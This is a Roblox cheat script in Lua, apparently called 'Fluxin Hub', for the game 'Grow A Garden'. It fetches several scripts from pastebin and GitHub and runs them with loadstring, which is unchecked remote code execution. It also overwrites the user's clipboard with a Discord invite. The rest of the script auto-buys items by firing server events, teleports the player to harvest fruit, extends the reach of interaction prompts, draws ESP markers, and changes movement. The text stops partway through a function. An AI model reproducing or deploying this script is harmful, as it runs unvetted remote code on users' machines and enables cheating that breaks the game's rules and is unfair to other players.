local OrionLib = loadstring(game:HttpGet('https://pastebin.com/raw/L83Chb0t'))()
-- Create Window
local Window = OrionLib:MakeWindow({
    Name = "Grow A Garden",
    HidePremium = false,
    SaveConfig = true,
    ConfigFolder = "GrowAGardenConfig",
    IntroEnabled = true,
    IntroText = "Fluxin Hub",
})
loadstring(game:HttpGet("https://pastebin.com/raw/GXSZeGQS"))()
setclipboard("https://discord.gg/kjmuSdNaTn") -- Replace with your actual Discord server link
OrionLib:MakeNotification({
Name = "Discord Link Copied",
Content = "Discord server link copied to clipboard!",
Time = 3
})
-- Removed the optional test call.
loadstring(game:HttpGet("https://raw.githubusercontent.com/ArgetnarYT/scripts/main/AntiAfk2.lua"))()
local PlayerTab = Window:MakeTab({
    Name = "Player",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
local player = game:GetService("Players").LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local gearTeleportUI = playerGui:WaitForChild("Teleport_UI"):WaitForChild("Frame"):WaitForChild("Gear")
gearTeleportUI.Visible = true
local petsTeleportUI = playerGui:WaitForChild("Teleport_UI"):WaitForChild("Frame"):WaitForChild("Pets")
petsTeleportUI.Visible = true
local Bloodmoon = PlayerTab:AddSection({
    Name = "Honey Update"
})
local function AutoBuyblood(Value)
    Autobuyblood = Value
    if Autobuyblood then
        while Autobuyblood do
            local boughtAny = false
            for _, seedName in ipairs({"Nectarine Seed", "Hive Fruit Seed", "Flower Seed Pack", "Honey Sprinkler", "Bee Egg"}) do
                pcall(function()
                    game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("BuyEventShopStock"):FireServer(seedName)
                    boughtAny = true
                end)
                task.wait(0.01)
            end
            if not boughtAny then
                print("No more seeds to buy, stopping auto-buy.")
                break
            end
            task.wait(1)
        end
    end
end


-- Add the auto buy seedstock toggle
PlayerTab:AddToggle({
    Name = "Auto BuyHoneyShop",
    Default = false,
    Callback = AutoBuyblood
})


local Sectionmoon = PlayerTab:AddSection({
    Name = "Moonlit Update"
})
local function createBillboard(part, fruitName)
	local billboard = Instance.new("BillboardGui")
	billboard.Name = "SwirlESP"
	billboard.Size = UDim2.new(0, 100, 0, 40)
	billboard.StudsOffset = Vector3.new(0, 2, 0)
	billboard.AlwaysOnTop = true
	billboard.Adornee = part

	local label = Instance.new("TextLabel")
	label.Size = UDim2.new(1, 0, 1, 0)
	label.BackgroundTransparency = 1
	label.TextScaled = true
	label.Font = Enum.Font.SourceSansBold
	label.TextColor3 = Color3.new(1, 1, 1)
	label.TextStrokeColor3 = Color3.new(0, 0, 0)
	label.TextStrokeTransparency = 0.5
	label.Text = fruitName
	label.Parent = billboard

	billboard.Parent = part
end

local function scanSwirlFruits()
    local Players   = game:GetService("Players")
    local Workspace = game:GetService("Workspace")
    local LocalPlayer = Players.LocalPlayer

    local farmContainer = Workspace:FindFirstChild("Farm")
    if not farmContainer then
        warn("Farm not found")
        return
    end

    local seenModels = {}

    for _, farmFolder in pairs(farmContainer:GetChildren()) do
        if farmFolder:IsA("Folder") and farmFolder.Name == "Farm" then
            local important = farmFolder:FindFirstChild("Important")
            if not important then continue end

            -- find the Data folder owned by the local player
            local dataFolder
            for _, child in pairs(important:GetChildren()) do
                if child:IsA("Folder") and child.Name == "Data" then
                    local owner = child:FindFirstChild("Owner")
                    if owner and owner:IsA("StringValue") and owner.Value == LocalPlayer.Name then
                        dataFolder = child
                        break
                    end
                end
            end
            if not dataFolder then continue end

            local plants = important:FindFirstChild("Plants_Physical")
            if not plants then continue end

            for _, plant in pairs(plants:GetChildren()) do
                for _, model in pairs(plant:GetDescendants()) do
                    if model:IsA("BasePart") and not seenModels[model] then
                        for _, obj in pairs(model:GetChildren()) do
                            if obj:IsA("ParticleEmitter") and obj.Name == "Swirls" then
                                -- check Speed exactly 30 to 30
                                local speedRange = obj.Speed
                                if typeof(speedRange) == "NumberRange"
                                   and speedRange.Min == 30
                                   and speedRange.Max == 30 then

                                    seenModels[model] = true
                                    print("Found Swirl w/ Speed=30 on:", plant.Name, "in", model.Name)

                                    createBillboard(model, plant.Name)

                                    for _, descendant in pairs(model:GetDescendants()) do
                                        local prompt = descendant:FindFirstChildWhichIsA("ProximityPrompt")
                                        if prompt then
                                            prompt.MaxActivationDistance = 100
                                            prompt.Exclusivity = Enum.ProximityPromptExclusivity.AlwaysShow
                                        end
                                    end
                                end
                                break
                            end
                        end
                    end
                end
            end
        end
    end
end


-- Attach to UI button
PlayerTab:AddButton({
	Name = "Esp Moonlit Fruit",
	Callback = function()
		scanSwirlFruits()
	end
})
-- Fargrab moonlit Fruits
local function scanAndModifyFruits()
	local Players = game:GetService("Players")
	local Workspace = game:GetService("Workspace")
	local LocalPlayer = Players.LocalPlayer

	local farmContainer = Workspace:FindFirstChild("Farm")
	if not farmContainer then
		warn("Farm not found")
		return
	end

	local seenModels = {}
	local modifiedFruitsCount = 0

	for _, farmFolder in pairs(farmContainer:GetChildren()) do
		if farmFolder:IsA("Folder") and farmFolder.Name == "Farm" then
			local important = farmFolder:FindFirstChild("Important")
			if not important then
				continue
			end

			local dataFolder = nil
			for _, child in pairs(important:GetChildren()) do
				if child:IsA("Folder") and child.Name == "Data" then
					local owner = child:FindFirstChild("Owner")
					if owner and owner:IsA("StringValue") and owner.Value == LocalPlayer.Name then
						dataFolder = child
						break
					end
				end
			end

			if not dataFolder then
				continue
			end

			local plants = important:FindFirstChild("Plants_Physical")
			if not plants then
				continue
			end

			for _, plant in pairs(plants:GetChildren()) do
				for _, model in pairs(plant:GetDescendants()) do
					if model:IsA("BasePart") and not seenModels[model] then
						for _, obj in pairs(model:GetChildren()) do
							if obj:IsA("ParticleEmitter") and obj.Name == "Swirls" then
								seenModels[model] = true

								local fruitParent = model.Parent
								if fruitParent then
									for _, child in pairs(fruitParent:GetChildren()) do
										if child:IsA("BasePart") then
											local prompt = child:FindFirstChildWhichIsA("ProximityPrompt")
											if prompt then
												prompt.MaxActivationDistance = 1000
												prompt.Exclusivity = Enum.ProximityPromptExclusivity.AlwaysShow
												modifiedFruitsCount += 1
												break -- Assuming only one ProximityPrompt per fruit part
											end
										end
									end
								end
								break -- Assuming only one "Swirls" emitter per model
							end
						end
					end
				end
			end
		end
	end
end
	print("Scan complete. Modified", modifiedFruitsCount, "fruit proximity prompts.")
PlayerTab:AddButton({
    Name = "Far Grab Moonllit",
    Callback = function()
        scanAndModifyFruits()
    end
})

PlayerTab:AddButton({
    Name = "Call Pets",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local CallAllPetsEvent = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("CallAllPets")
        if CallAllPetsEvent and CallAllPetsEvent:IsA("RemoteEvent") then
            pcall(function()
                CallAllPetsEvent:FireServer()
            end)
        else
            warn("Could not find the 'CallAllPets' RemoteEvent or it's not a RemoteEvent.")
            if not CallAllPetsEvent then
                warn("CallAllPetsEvent is nil.")
            else
                warn("CallAllPetsEvent is a:", typeof(CallAllPetsEvent))
            end
        end
    end
})

local VirtualInputManager = game:GetService("VirtualInputManager")
local SectionPlayer = PlayerTab:AddSection({
    Name = "Player"
})
-- Configuration
local restockTimeInSeconds = 100  -- Default: 300 seconds (5 minutes). Change this if needed.
local AutobuyEggs = false

-- Function to buy a specific egg
local function BuyEgg(eggPosition)
    local args = {
        [1] = eggPosition
    }
    pcall(function()
        game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("BuyPetEgg"):FireServer(unpack(args))
    end)
end

-- Configuration
local AutobuyEggs = false

-- Function to buy a specific egg
local function BuyEgg(eggPosition)
    local args = {
        [1] = eggPosition
    }
    pcall(function()
        game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("BuyPetEgg"):FireServer(unpack(args))
    end)
end

-- Function to buy all three eggs at the same time
local function BuyAllEggs()
    BuyEgg(1)
    BuyEgg(2)
    BuyEgg(3)
end

-- Main loop for auto-buying every frame, controlled by the toggle
local connection = nil  -- Store the connection so we can disconnect it later
local function AutoBuyEggsFunction(Value)
    AutobuyEggs = Value
    if AutobuyEggs then
        if not connection then -- Only create the connection if it doesn't exist
            connection = game:GetService("RunService").Heartbeat:Connect(function()
                BuyAllEggs()
            end)
            print("Auto Buy Eggs: Enabled")
        end
    else
        if connection then -- Only disconnect if the connection exists
            connection:Disconnect()
            connection = nil -- Clear the variable
            print("Auto Buy Eggs: Disabled")
        end
    end
end

-- Add a toggle to start/stop the auto-buy process
if PlayerTab then
    PlayerTab:AddToggle({
        Name = "Auto Buy Eggs",
        Default = false,
        Callback = AutoBuyEggsFunction
    })
else
    print("Error: PlayerTab is not defined.  Make sure your UI library is initialized.")
end



-- Auto buy seedstock function
local function AutoBuySeeds(Value)
    Autobuyseeds = Value
    if Autobuyseeds then
        while Autobuyseeds do
            local boughtAny = false
            for _, seedName in ipairs({"Carrot", "Strawberry", "Blueberry", "Tomato", "Corn", "Watermelon", "Pumpkin", "Apple",
                "Bamboo", "Coconut", "Cactus", "Dragon", "Mango", "Lemon", "Pear", "Daffodil", "Grape", "Mushroom", "Orange Tulip", "Pepper", "Cacao", "Beanstalk", "Ember Lily", "Sugar Apple"}) do -- Directly using the seed names
                pcall(function()
                    game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("BuySeedStock"):FireServer(seedName)
                    boughtAny = true
                end)
                task.wait(0.5)
            end
            if not boughtAny then
                print("No more seeds to buy, stopping auto-buy.")
                break
            end
            task.wait(0)
        end
    end
end

-- Add the auto buy seedstock toggle
PlayerTab:AddToggle({
    Name = "Auto Buy Seeds",
    Default = false,
    Callback = AutoBuySeeds
})

-- Auto Buy Gears
local Autobuygears = false
local gearstocks = {
    'Watering Can',
    'Basic Sprinkler',
    'Trowerl',
    'Recall Wrench',
    'Advanced Sprinkler',
    'Godly Sprinkler',
    'Lightning Rod',
    'Master Sprinkler',
}

local function AutoBuyGears(Value)
    Autobuygears = Value
    if Autobuygears then
        -- Instead of a single loop, use a loop that continues while Autobuygears is true
        while Autobuygears do
            local boughtAny = false -- Track if we bought anything in this iteration
            for _, gearName in ipairs(gearstocks) do
                pcall(function()
                    game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("BuyGearStock"):FireServer(gearName)
                    boughtAny = true -- Set to true if purchase is attempted
                end)
                task.wait(0.5)
            end
            if not boughtAny then
                -- If we didn't buy anything in this iteration, it might mean we're done
                print("No more gears to buy, stopping auto-buy.")
                break -- Exit the while loop
            end
            task.wait(1) -- Add a small delay to prevent excessive server requests, reduced from 5 to 1.
        end
    end
end

PlayerTab:AddToggle({
    Name = "Auto Buy Gears",
    Default = false,
    Callback = AutoBuyGears
})


-- Infinite Jump
local infiniteJumpEnabled = false
PlayerTab:AddToggle({
    Name = "Infinite Jump",
    Default = false,
    Callback = function(Value)
        infiniteJumpEnabled = Value
    end
})

-- WalkSpeed Slider
PlayerTab:AddSlider({
    Name = "WalkSpeed",
    Min = 1,
    Max = 100,
    Default = 16,
    Increment = 1,
    ValueName = "Speed",
    Callback = function(Value)
        local character = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid.WalkSpeed = Value
        end
    end
})
--Autofarm tab
local Autofarm = Window:MakeTab({
    Name = "Autofarm's",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
--autofarm
-- state
local autoTeleportFruits = false
local originalCFrame

-- helper to fire a proximity prompt once
local function firePrompt(prompt)
    prompt:InputHoldBegin()
    task.wait(prompt.HoldDuration or 0.1)
    prompt:InputHoldEnd()
end

-- core routine: teleport, configure, fire multiple times, then next
local function collectAllAndTeleport()
    local RunService  = game:GetService("RunService")
    local Players     = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer

    -- locate your Data folder
    local farmRoot = workspace:FindFirstChild("Farm")
    if not farmRoot then return warn("Farm not found") end

    local dataFolder
    for _, f in ipairs(farmRoot:GetChildren()) do
        if f.Name == "Farm" then
            local imp = f:FindFirstChild("Important")
            if imp then
                for _, df in ipairs(imp:GetChildren()) do
                    if df.Name == "Data"
                    and df:FindFirstChild("Owner")
                    and df.Owner.Value == LocalPlayer.Name then
                        dataFolder = df
                        break
                    end
                end
            end
        end
        if dataFolder then break end
    end
    if not dataFolder then return warn("Data folder not found") end

    local plants = dataFolder.Parent:FindFirstChild("Plants_Physical")
    if not plants then return warn("Plants_Physical missing") end

    -- gather every fruit part + prompt
    local tasks = {}
    for _, plant in ipairs(plants:GetChildren()) do
        local fruitsFolder = plant:FindFirstChild("Fruits")
        if fruitsFolder then
            for _, model in ipairs(fruitsFolder:GetChildren()) do
                for _, part in ipairs(model:GetChildren()) do
                    if part:IsA("BasePart") then
                        local prompt = part:FindFirstChildOfClass("ProximityPrompt")
                        if prompt then
                            table.insert(tasks, { part = part, prompt = prompt })
                        end
                    end
                end
            end
        end
    end

    if #tasks == 0 then 
        print("No fruit prompts to collect.") 
        return 
    end

    -- process each fruit
    for _, entry in ipairs(tasks) do
        if not autoTeleportFruits then return end
        local part, prompt = entry.part, entry.prompt
        local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if not hrp then return end

        -- teleport above
        hrp.CFrame = part.CFrame * CFrame.new(0, 5, 0)
        RunService.Heartbeat:Wait()

        -- make prompt visible
        prompt.MaxActivationDistance = 100
        prompt.Exclusivity = Enum.ProximityPromptExclusivity.AlwaysShow

        -- fire it multiple times
        for i = 1, 3 do
            firePrompt(prompt)
            task.wait(0.1)
        end
    end

    print("Completed one pass of all fruits.")
end

-- UI toggle hookup
Autofarm:AddToggle({
    Name    = "Auto Farm Fruits",
    Default = false,
    Callback = function(on)
        autoTeleportFruits = on

        -- grab HRP once here
        local Players     = game:GetService("Players")
        local LocalPlayer = Players.LocalPlayer
        local hrp         = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")

        if on then
            -- save start pos
            if hrp then originalCFrame = hrp.CFrame end

            -- loop until toggled off
            spawn(function()
                while autoTeleportFruits do
                    collectAllAndTeleport()
                    task.wait(1)
                end
            end)
        else
            -- return to start
            if hrp and originalCFrame then
                hrp.CFrame = originalCFrame
                originalCFrame = nil
            end
        end
    end
})

-- autofarm swirls
-- Services and common locals
local Players      = game:GetService("Players")
local Workspace    = game:GetService("Workspace")
local RunService   = game:GetService("RunService")
local LocalPlayer  = Players.LocalPlayer

-- State variables
local autoFarm          = false
local autoActivate      = false
local originalFarmCF    = nil
local originalCompCF    = nil

-- Compressor event
local HoneyMachineRE = RepStorage:WaitForChild("GameEvents"):WaitForChild("HoneyMachineService_RE")

-- Helper: Check if any compressor prompt exists (Onett or Jar)
local function compressorPromptExists()
    local interaction = Workspace:FindFirstChild("Interaction")
    local honeyEvent = interaction and interaction:FindFirstChild("UpdateItems") and interaction.UpdateItems:FindFirstChild("HoneyEvent")
    local compressor = honeyEvent and honeyEvent:FindFirstChild("HoneyCombpressor")
    if not compressor then return false end
    -- check both Onett and Jar
    for _, name in ipairs({"Onett","Spout"}) do
        local part = compressor:FindFirstChild(name)
        if part and part:FindFirstChild("HoneyCombpressorPrompt") then
            return true
        end
    end
    return false
end

-- Helper: find any tool containing "Pollinated"
local function findPollinatedTool()
    for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
        if tool:IsA("Tool") and tool.Name:match("Pollinated") then
            return tool
        end
    end
    return nil
end

-- Helper: collect/activate compressor via remote every 10s
local function activateCompressorCycle()
    -- equip pollinated tool
    local tool = findPollinatedTool()
    if tool and LocalPlayer.Character then
        LocalPlayer.Character.Humanoid:EquipTool(tool)
    end
    -- fire server event
    pcall(function()
        HoneyMachineRE:FireServer("MachineInteract")
    end)
end

-- Gather honey tasks under your owned plot
local function getHoneyTasks()
    local farmRoot = Workspace:FindFirstChild("Farm")
    local dataFolder
    if farmRoot then
        for _, f in ipairs(farmRoot:GetChildren()) do
            if f.Name == "Farm" then
                local imp = f:FindFirstChild("Important")
                if imp then
                    for _, df in ipairs(imp:GetChildren()) do
                        if df.Name == "Data" and df:FindFirstChild("Owner") and df.Owner.Value == LocalPlayer.Name then
                            dataFolder = df
                            break
                        end
                    end
                end
            end
            if dataFolder then break end
        end
    end
    if not dataFolder then return {} end

    local tasks = {}
    local plants = dataFolder.Parent:FindFirstChild("Plants_Physical")
    if plants then
        for _, plant in ipairs(plants:GetChildren()) do
            local fruits = plant:FindFirstChild("Fruits")
            if fruits then
                for _, fruit in ipairs(fruits:GetChildren()) do
                    local part = fruit.PrimaryPart
                    if part and part:FindFirstChildWhichIsA("ParticleEmitter") then
                        local prompt = fruit:FindFirstChildWhichIsA("ProximityPrompt", true)
                        if prompt then
                            table.insert(tasks, {part=part,prompt=prompt})
                        end
                    end
                end
            end
        end
    end
    return tasks
end

-- Farm honey cycle
local function farmHoneyCycle()
    local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    for _, entry in ipairs(getHoneyTasks()) do
        if not autoFarm then break end
        -- pause if compressor active
        if autoActivate then break end
        -- teleport and fire prompt
        hrp.CFrame = entry.part.CFrame * CFrame.new(0,5,0)
        RunService.Heartbeat:Wait()
        entry.prompt.MaxActivationDistance = 100
        entry.prompt.Exclusivity = Enum.ProximityPromptExclusivity.AlwaysShow
        for i=1,3 do
            entry.prompt:InputHoldBegin()
            task.wait(entry.prompt.HoldDuration or 0.1)
            entry.prompt:InputHoldEnd()
            task.wait(0.1)
        end
    end
end

-- Toggles & UI (assuming a UI library exists)
Autofarm:AddToggle({
    Name = "Auto Farm Honey",
    Default = false,
    Callback = function(on)
        autoFarm = on
        local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if on then
            originalFarmCF = hrp and hrp.CFrame
            spawn(function()
                while autoFarm do
                    farmHoneyCycle()
                    task.wait(1)
                end
            end)
        else
            if hrp and originalFarmCF then hrp.CFrame = originalFarmCF end
            originalFarmCF = nil
        end
    end
})

-- Services and common locals
local Players      = game:GetService("Players")
local Workspace    = game:GetService("Workspace")
local RunService   = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LocalPlayer  = Players.LocalPlayer
local HoneyMachineRE = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("HoneyMachineService_RE")

-- State variables
local autoCompressor    = false

-- Helper: Find valid Pollinated tool in backpack
local function findTool()
    for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
        if tool:IsA("Tool") and tool.Name:lower():find("pollinated") then
            return tool
        end
    end
    return nil
end

-- Toggle: Auto Submit Honey with Tool
Autofarm:AddToggle({
    Name    = "Auto Submit Honey Plants",
    Default = false,
    Callback = function(on)
        autoCompressor = on

        if on then
            spawn(function()
                while autoCompressor do
                    local tool = findTool()
                    if tool and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                        LocalPlayer.Character.Humanoid:EquipTool(tool)
                    end
                    pcall(function()
                        HoneyMachineRE:FireServer("MachineInteract")
                    end)
                    task.wait(10)
                end
            end)
        end
    end
})

--Esp tab
local Esptab = Window:MakeTab({
    Name = "Esp's",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
local Players   = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local LocalPlayer = Players.LocalPlayer

-- Helper: find the Model to parent our BillboardGui to
local function getBillboardTarget(obj)
    -- if the direct parent is a Model, use it
    if obj.Parent and obj.Parent:IsA("Model") then
        return obj.Parent
    end
    -- otherwise climb up until we hit a Model (or give up)
    return obj:FindFirstAncestorWhichIsA("Model")
end

-- Generic scanner: takes a filter and a label
local function scanFruits(filterFn, label)
    local farmContainer = Workspace:FindFirstChild("Farm")
    if not farmContainer then
        warn("Farm not found")
        return
    end

    local seen = {}

    for _, farmFolder in ipairs(farmContainer:GetChildren()) do
        if farmFolder:IsA("Folder") and farmFolder.Name == "Farm" then
            local important = farmFolder:FindFirstChild("Important")
            if not important then continue end

            -- only your-owned plots
            local dataFolder
            for _, c in ipairs(important:GetChildren()) do
                if c:IsA("Folder") and c.Name == "Data" then
                    local owner = c:FindFirstChild("Owner")
                    if owner and owner.Value == LocalPlayer.Name then
                        dataFolder = c
                        break
                    end
                end
            end
            if not dataFolder then continue end

            local plants = important:FindFirstChild("Plants_Physical")
            if not plants then continue end

            for _, plant in ipairs(plants:GetChildren()) do
                for _, part in ipairs(plant:GetDescendants()) do
                    if part:IsA("BasePart") and not seen[part] then
                        for _, obj in ipairs(part:GetChildren()) do
                            if filterFn(obj) then
                                seen[part] = true
                                local targetModel = getBillboardTarget(obj)
                                if targetModel then
                                    print("Found "..label.." on:", plant.Name, "in", targetModel.Name)
                                    createBillboard(targetModel, plant.Name)
                                end
                                -- boost any prompts
                                for _, d in ipairs(part:GetDescendants()) do
                                    local prompt = d:FindFirstChildWhichIsA("ProximityPrompt")
                                    if prompt then
                                        prompt.MaxActivationDistance = 100
                                        prompt.Exclusivity = Enum.ProximityPromptExclusivity.AlwaysShow
                                    end
                                end
                                break
                            end
                        end
                    end
                end
            end
        end
    end
end

-- Bloodlit: under Effects folder, Lifetime = 2 to 3
local function scanBloodlitFruits()
    scanFruits(function(obj)
        return obj:IsA("ParticleEmitter")
           and obj.Name == "Swirls"
           and typeof(obj.Brightness) == "number"
           and obj.Brightness == 5
    end, "Bloodlit Fruit")
end


-- Rainbow: any ParticleEmitter named "Rainbow"
local function scanRainbowFruits()
    local farmContainer = Workspace:FindFirstChild("Farm")
    if not farmContainer then
        warn("Farm not found")
        return
    end

    local seenPlants = {}

    for _, farmFolder in ipairs(farmContainer:GetChildren()) do
        if not (farmFolder:IsA("Folder") and farmFolder.Name == "Farm") then
            continue
        end

        local important = farmFolder:FindFirstChild("Important")
        if not important then
            print("[Rainbow Debug] No Important in", farmFolder:GetFullName())
            continue
        end

        -- your-owned plots
        local dataFolder
        for _, c in ipairs(important:GetChildren()) do
            if c:IsA("Folder") and c.Name == "Data" then
                local owner = c:FindFirstChild("Owner")
                if owner and owner.Value == LocalPlayer.Name then
                    dataFolder = c
                    break
                end
            end
        end
        if not dataFolder then
            print("[Rainbow Debug] No Data folder for player in", important:GetFullName())
            continue
        end

        local plants = important:FindFirstChild("Plants_Physical")
        if not plants then
            print("[Rainbow Debug] No Plants_Physical in", important:GetFullName())
            continue
        end

        for _, plant in ipairs(plants:GetChildren()) do
            print("[Rainbow Debug] Checking plant:", plant.Name)
            local fruits = plant:FindFirstChild("Fruits")
            if not fruits then
                print("  [Rainbow Debug]   No Fruits folder under plant", plant.Name)
                continue
            end

            for _, obj in ipairs(fruits:GetDescendants()) do
                -- log every attachment encountered
                if obj:IsA("Attachment") and obj.Name:lower() == "rainbow" then
                    print("  [Rainbow Debug]   Found Attachment.rainbow at:", obj:GetFullName())

                    for _, desc in ipairs(obj:GetDescendants()) do
                        if desc:IsA("ParticleEmitter") and desc.Name:lower() == "rainbow" then
                            print("    [Rainbow Debug]   Found ParticleEmitter 'rainbow' at:", desc:GetFullName())
                            if not seenPlants[plant] then
                                seenPlants[plant] = true
                                print("    [Rainbow Debug]   → MATCH on plant:", plant.Name)
                                createBillboard(plant, plant.Name)
                                -- boost prompts
                                for _, d in ipairs(plant:GetDescendants()) do
                                    local prompt = d:FindFirstChildWhichIsA("ProximityPrompt")
                                    if prompt then
                                        prompt.MaxActivationDistance = 100
                                        prompt.Exclusivity = Enum.ProximityPromptExclusivity.AlwaysShow
                                    end
                                end
                            end
                            break
                        end
                    end
                end
            end
        end
    end
end



-- Golden: Shine_Particle emitters, billboard on enclosing Model
local function scanGoldenFruits()
    scanFruits(function(obj)
        return obj:IsA("ParticleEmitter")
           and obj.Name == "Shine_Particle"
    end, "Golden Fruit")
end
local function scanCelestialFruits()
    scanFruits(function(obj)
        return obj:IsA("ParticleEmitter") and obj.Name == "ParticleEmitter"
    end, "Celestial Fruit")
end


-- Buttons
Esptab:AddButton({
    Name = "ESP Celestial Fruit",
    Callback = scanCelestialFruits,
})

Esptab:AddButton({
    Name = "ESP Bloodlit Fruits",
    Callback = scanBloodlitFruits,
})

Esptab:AddButton({
    Name = "ESP Rainbow Fruits",
    Callback = scanRainbowFruits,
})

Esptab:AddButton({
    Name = "ESP Golden Fruits",
    Callback = scanGoldenFruits,
})

-- (Optionally) Clear previous billboards
local function clearAllBillboards()
    for _, gui in ipairs(Workspace:GetDescendants()) do
        if gui:IsA("BillboardGui") then
            gui:Destroy()
        end
    end
    print("Cleared all ESP billboards.")
end

Esptab:AddButton({
    Name = "Clear ESP Billboards",
    Callback = clearAllBillboards,
})


--autofarm



-- Main Tab
local MainTab = Window:MakeTab({
    Name = "Main",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

local SectionMain = MainTab:AddSection({
    Name = "Main"
})

-- Buy
local Selector1 = PlayerTab:AddDropdown({
    Name = "Buy",
    Default = "nothing",
    Options = {"nothing", "Carrot", "Strawberry", "Blueberry", "Tomato", "Corn", "Watermelon", "Pumpkin", "Apple",
        "Bamboo", "Coconut", "Cactus", "Dragon", "Mango", "Lemon", "Pear", "Daffodil", "Grape", "Mushroom", "Orange Tulip"},
    Callback = function(selectedFruit)
        game:GetService("ReplicatedStorage"):WaitForChild("GameEvents", 9e9)
            :WaitForChild("BuySeedStock", 9e9)
            :FireServer(selectedFruit)
    end
})


-- Far Grab
local Selector2 = MainTab:AddDropdown({
    Name = "Far Grab",
    Default = "nothing",
    Options = {"nothing", "Strawberry", "Blueberry", "Peach", "Candy Blossom", "Tomato", "Corn", "Watermelon", "Pumpkin", "Apple",
"Bamboo", "Coconut", "Cactus", "Dragon Fruit", "Mango", "Raspberry", "Easter Egg", "Pear", "Lemon", "Daffodil",
"Grape", "Mushroom", "Orange Tulip", "Cranberry", "Durian", "Eggplant", "Venus Fly Trap", "Banana", "Pepper",
"Lotus", "Cherry Blossom", "Soul Fruit", "Cursed Fruit", "Passionfruit", "Chocolate Carrot", "Red Lollipop",
"Candy Sunflower", "Papaya", "Pineapple", "Cacao", "Nightshade", "Mint", "Glowshroom", "Moonflower", "Starfruit",
"Moonglow", "Blood Banana", "Moon Melon", "Celestiberry", "Moon Mango", "Beanstalk"},
    Callback = function(selectedFruit)
        local LocalPlayer = game:GetService("Players").LocalPlayer
        local Workspace = game:GetService("Workspace")
        local farmContainer = Workspace:FindFirstChild("Farm")
        if not farmContainer then
            warn("Farm container not found in Workspace.")
            return
        end
        local updatedCount = 0
        for _, farmFolder in pairs(farmContainer:GetChildren()) do
            if farmFolder:IsA("Folder") and farmFolder.Name == "Farm" then
                local important = farmFolder:FindFirstChild("Important")
                if important then
                    local dataFolder = nil
                    for _, child in pairs(important:GetChildren()) do
                        if child:IsA("Folder") and child.Name == "Data" then
                            local owner = child:FindFirstChild("Owner")
                            if owner and owner:IsA("StringValue") and owner.Value == LocalPlayer.Name then
                                dataFolder = child
                                break
                            end
                        end
                    end
                    if dataFolder then
                        local plants = important:FindFirstChild("Plants_Physical")
                        if plants then
                            for _, plant in pairs(plants:GetChildren()) do
                                if plant.Name == selectedFruit then
                                    local fruitsFolder = plant:FindFirstChild("Fruits")
                                    if fruitsFolder then
                                        for _, model in pairs(fruitsFolder:GetChildren()) do
                                            for _, part in pairs(model:GetChildren()) do
                                                local prompt = part:FindFirstChild("ProximityPrompt")
                                                if prompt then
                                                    prompt.MaxActivationDistance = 100
                                                    prompt.Exclusivity = 'AlwaysShow'
                                                    updatedCount = updatedCount + 1
                                                end
                                            end
                                        end
                                    else
                                        warn("Couldn't find Fruits folder for: " .. plant.Name .. " in your farm.")
                                    end
                                end
                            end
                        else
                            warn("Couldn't find Plants_Physical folder in your farm.")
                        end
                    end
                end
            end
        end
        print("Updated " .. updatedCount .. " " .. selectedFruit .. " prompts in your farms.")
    end
})

-- Farm Number Display
local function displayFarmNumber()
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    local farmContainer = workspace:WaitForChild("Farm")
    for _, farmFolder in pairs(farmContainer:GetChildren()) do
        if farmFolder:IsA("Folder") and farmFolder.Name == "Farm" then
            local important = farmFolder:FindFirstChild("Important")
            if important and important:IsA("Folder") then
                local data = important:FindFirstChild("Data")
                if data and data:IsA("Folder") then
                    local owner = data:FindFirstChild("Owner")
                    local farmNumber = data:FindFirstChild("Farm_Number")
                    if owner and farmNumber and owner:IsA("StringValue") then
                        if owner.Value == LocalPlayer.Name then
                            return "Your farm number is: " .. tostring(farmNumber.Value)
                        end
                    end
                end
            end
        end
    end
    return "Farm number not found."
end

local FarmNumberLabel = MainTab:AddLabel(displayFarmNumber())

spawn(function()
    while true do
        task.wait(5)
        FarmNumberLabel:Set(displayFarmNumber())
    end
end)
-- Toggle Stocks GUI
MainTab:AddButton({
    Name = "Create Stocks GUI",
    Callback = function()
        local function createStocksGUI(guiName, priorityFruitNames)
            local Players = game:GetService("Players")
            local LocalPlayer = Players.LocalPlayer
            local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
            local seedShopFrame = PlayerGui:FindFirstChild("Seed_Shop")
            if not seedShopFrame then
                warn("Seed_Shop GUI not found.")
                return nil
            end
            local scrollingFrame = seedShopFrame.Frame:FindFirstChild("ScrollingFrame")
            if not scrollingFrame then
                warn("ScrollingFrame not found in Seed_Shop.")
                return nil
            end
            local previousGUI = PlayerGui:FindFirstChild(guiName)
            if previousGUI then
                previousGUI:Destroy()
            end
            local stocksgui = Instance.new("ScreenGui")
            stocksgui.Name = guiName
            stocksgui.Enabled = false
            stocksgui.Parent = PlayerGui
            stocksgui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
            local Frame = Instance.new("Frame")
